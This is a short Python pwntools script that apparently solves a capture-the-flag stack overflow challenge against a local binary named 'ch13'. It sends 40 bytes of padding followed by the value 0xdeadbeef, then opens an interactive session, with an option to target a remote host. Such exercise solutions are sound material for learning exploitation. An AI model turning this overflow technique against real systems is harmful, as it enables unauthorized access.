from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

exe = "./ch13"
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'

io = start()

padding = 40

payload = flat(
    padding * b'A',
    p32(0xdeadbeef)
)

io.sendline(payload)

io.interactive()